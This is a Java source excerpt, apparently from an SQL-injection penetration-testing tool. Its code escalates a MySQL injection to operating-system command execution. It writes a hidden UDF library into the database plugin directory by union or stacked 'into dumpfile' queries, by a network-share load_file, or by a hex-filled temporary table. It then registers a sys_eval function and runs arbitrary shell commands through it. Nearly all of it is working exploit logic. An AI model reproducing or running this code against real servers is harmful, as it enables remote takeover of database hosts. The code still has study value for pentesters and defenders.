51      public void createUdf(String pathNetshareFolder, ExploitMethod exploitMethod) throws JSqlException {
52          if (this.injectionModel.getResourceAccess().isReadingNotAllowed()) {
53              return;
54          }
55  
56          var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificNormal().getNbIndexesFound() - 1;
57          var pathPlugin = this.getResult("select@@plugin_dir", "udf#dir");
58          if (StringUtils.isEmpty(pathPlugin)) {
59              throw new JSqlException("Incorrect plugin folder: path is empty");
60          }
61  
62          var versionOsMachine = this.getResult("select concat(@@version_compile_os,@@version_compile_machine)", "udf#check-os");
63          if (StringUtils.isEmpty(versionOsMachine)) {
64              throw new JSqlException("Incorrect remote machine: unknown system");
65          }
66          var isWin = versionOsMachine.toLowerCase().contains("win") && !versionOsMachine.toLowerCase().contains("linux");
67  
68          String nameLibrary;
69          if (versionOsMachine.contains("64")) {
70              nameLibrary = isWin ? "64.dll" : "64.so";
71          } else {
72              nameLibrary = isWin ? "32.dll" : "32.so";
73          }
74  
75          pathPlugin = pathPlugin.replace("\\", "/");
76          if (!pathPlugin.endsWith("/")) {
77              pathPlugin = String.format("%s%s", pathPlugin, "/");
78          }
79  
80          if (!this.injectionModel.getMediatorStrategy().getStack().isApplicable()) {
81              LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit UDF requires stack query, trying anyway...");
82          }
83          String isSuccess = StringUtils.EMPTY;
84          if (exploitMethod == ExploitMethod.NETSHARE) {
85              if (!pathNetshareFolder.endsWith("\\")) {
86                  pathNetshareFolder += "\\";
87              }
88              UdfAccess.copyToShare(pathNetshareFolder, nameLibrary);
89              isSuccess = this.byNetshare(
90                  nbIndexesFound,
91                  pathNetshareFolder,
92                  nameLibrary,
93                  pathPlugin,
94                  this.biPredConfirm
95              );
96          } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {
97              if (StringUtil.GET.equals(this.injectionModel.getMediatorUtils().getConnectionUtil().getTypeRequest())) {
98                  LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "GET too limited for UDF with body query, should use POST instead but using GET anyway...");
99              }
100             isSuccess = this.byQueryBody(
101                 nbIndexesFound,
102                 pathPlugin,
103                 nameLibrary,
104                 UdfAccess.toHexChunks(nameLibrary),
105                 this.biPredConfirm
106             );
107         }
108         if (StringUtils.isEmpty(isSuccess) && exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {
109             var nameLibraryRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameLibrary;
110             this.byTable(UdfAccess.toHexChunks(nameLibrary), pathPlugin + nameLibraryRandom);
111             this.biPredConfirm.test(pathPlugin, nameLibraryRandom);
112         }
113     }

115     public String byQueryBody(
116         int nbIndexesFound,
117         String pathRemoteFolder,
118         String nameExploit,
119         List<String> hexChunks,
120         BiPredicate<String,String> biPredConfirm
121     ) {
122         String nameExploitValidated = StringUtils.EMPTY;
123         var pattern = " %s SELECT %s 0x%s into dumpfile '%s'";
124 
125         var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
126         this.injectionModel.injectWithoutIndex(String.format(pattern,
127             "union",
128             "'',".repeat(nbIndexesFound),
129             String.join("", hexChunks),
130             pathRemoteFolder + nameExploitRandom
131         ), "body#union-dump");
132         if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
133             nameExploitValidated = nameExploitRandom;
134         }
135         if (StringUtils.isEmpty(nameExploitValidated)) {
136             LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Query body connection failure with union, trying with stack...");
137             nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
138             this.injectionModel.injectWithoutIndex(String.format(pattern,
139                 ";",
140                 StringUtils.EMPTY,
141                 String.join("", hexChunks),
142                 pathRemoteFolder + nameExploitRandom
143             ), "body#stack-dump");
144             if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
145                 nameExploitValidated = nameExploitRandom;
146             }
147         }
148         return nameExploitValidated;
149     }

151     public String byNetshare(
152         int nbIndexesFound,
153         String pathNetshareFolder,
154         String nameExploit,
155         String pathRemoteFolder,
156         BiPredicate<String,String> biPredConfirm
157     ) {
158         String nameExploitValidated = StringUtils.EMPTY;
159         var pathShareEncoded = pathNetshareFolder.replace("\\", "\\\\");
160         var pattern = " %s SELECT %s load_file('%s') into dumpfile '%s'";
161 
162         LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using netshare and union...");
163         var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
164         this.injectionModel.injectWithoutIndex(String.format(pattern,
165             "union",
166             "'',".repeat(nbIndexesFound),
167             pathShareEncoded + nameExploit,
168             pathRemoteFolder + nameExploitRandom
169         ), "udf#share-union");
170         if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
171             nameExploitValidated = nameExploitRandom;
172         }
173         if (StringUtils.isEmpty(nameExploitValidated)) {
174             LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using netshare and stack...");
175             nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
176             this.injectionModel.injectWithoutIndex(String.format(pattern,
177                 ";",
178                 StringUtils.EMPTY,
179                 pathShareEncoded + nameExploit,
180                 pathRemoteFolder + nameExploitRandom
181             ), "udf#share-stack");
182             if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
183                 nameExploitValidated = nameExploitRandom;
184             }
185         }
186         return nameExploitValidated;
187     }

189     private static void copyToShare(String pathNetshare, String nameLibrary) throws JSqlException {
190         try {
191             URI original = Objects.requireNonNull(UdfAccess.class.getClassLoader().getResource("udf/" + nameLibrary)).toURI();
192             Path originalPath = new File(original).toPath();
193             Path copied = Paths.get(pathNetshare + nameLibrary);
194             Files.copy(originalPath, copied, StandardCopyOption.REPLACE_EXISTING);
195         } catch (IOException | URISyntaxException e) {
196             throw new JSqlException("Copy udf into local network share failure: " + e.getMessage());
197         }
198     }

200     public void byTable(List<String> bodyHexChunks, String pathRemoteFile) throws JSqlException {
201         LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection with table and stack...");
202         var nameDatabase = this.getResult("select database()", "tbl#dbname");
203         if (StringUtils.isEmpty(nameDatabase) || StringUtil.INFORMATION_SCHEMA.equals(nameDatabase)) {
204             nameDatabase = "mysql";
205         }
206         var nameTableRandom = UdfAccess.NAME_TABLE +"_"+ RandomStringUtils.secure().nextAlphabetic(8);  // underscore required, dash not allowed
207         var nameSchemaTable = nameDatabase +"."+ nameTableRandom;
208         this.injectionModel.injectWithoutIndex("; drop table "+ nameSchemaTable, "tbl#tbl");
209         var countResult = this.getCountTable(nameDatabase, nameTableRandom);
210         if (!"0".equals(countResult)) {
211             throw new JSqlException("Drop table failure: "+ countResult);
212         }
213         this.injectionModel.injectWithoutIndex("; create table "+ nameSchemaTable +"(data longblob)", "tbl#create");
214         countResult = this.getCountTable(nameDatabase, nameTableRandom);
215         if (!"1".equals(countResult)) {
216             throw new JSqlException("Create table failure: "+ countResult);
217         }
218         int indexChunk = 0;
219         for (String chunk: bodyHexChunks) {
220             if (indexChunk == 0) {
221                 this.injectionModel.injectWithoutIndex("; insert into "+ nameSchemaTable +"(data) values (0x"+chunk+")", "tbl#init");
222             } else {
223                 this.injectionModel.injectWithoutIndex("; update "+ nameSchemaTable +" set data = concat(data,0x"+chunk+")", "tbl#fill");
224             }
225             indexChunk++;
226         }
227         this.injectionModel.injectWithoutIndex("; select data from "+ nameSchemaTable +" into dumpfile '"+ pathRemoteFile +"'", "tbl#dump");
228     }

230     private String getCountTable(String nameDatabase, String nameTableRandom) {
231         try {
232             return this.getResult(
233                 "select count(table_name) from information_schema.tables " +
234                 "where table_type like 'base table' and table_name = '"+ nameTableRandom +"' " +
235                 "and table_schema = '" + nameDatabase + "'",
236                 "tbl#check"
237             );
238         } catch (JSqlException e) {
239             return e.getMessage();  // error message then logged
240         }
241     }

243     private boolean buildSysEval(String nameLibrary) throws JSqlException {
244         this.injectionModel.injectWithoutIndex("; drop function sys_eval", "udf#del-func");
245         this.injectionModel.injectWithoutIndex(
246             "; create function sys_eval returns string soname '"+ nameLibrary +"'",
247             "udf#function"
248         );
249         var confirm = this.getResult("select group_concat(name)from mysql.func", "udf#confirm");
250         if (!confirm.contains("sys_eval")) {
251             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Udf failure: sys_eval not found");
252             return false;
253         }
254         LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Udf successful: sys_eval found");
255 
256         var request = new Request();
257         request.setMessage(Interaction.ADD_TAB_EXPLOIT_UDF);
258         request.setParameters(null, null);
259         this.injectionModel.sendToViews(request);
260         return true;
261     }

263     public String runCommand(String command, UUID uuidShell) {
264         String result;
265         try {
266             result = this.getResult(  // 0xff splits single result in many chunks => replace by space
267                 "select cast(replace(sys_eval('"+command+"'),0xff,0x20)as char(70000) character set utf8)",
268                 "udf#run-cmd"
269             );
270         } catch (JSqlException e) {
271             result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
272         }
273         var request = new Request();
274         request.setMessage(Interaction.GET_EXPLOIT_UDF_RESULT);
275         request.setParameters(uuidShell, result);
276         this.injectionModel.sendToViews(request);
277         return result;
278     }

280     private static List<String> toHexChunks(String filename) throws JSqlException {
281         try {
282             byte[] fileData = Objects.requireNonNull(  // getResource > toURI > toPath > readAllBytes() not possible in .jar
283                 UdfAccess.class.getClassLoader().getResourceAsStream("udf/"+ filename +".cloak")
284             ).readAllBytes();
285             fileData = StringUtil.uncloak(fileData);
286             return StringUtil.toHexChunks(fileData);
287         } catch (IOException e) {
288             throw new JSqlException(e);
289         }
290     }
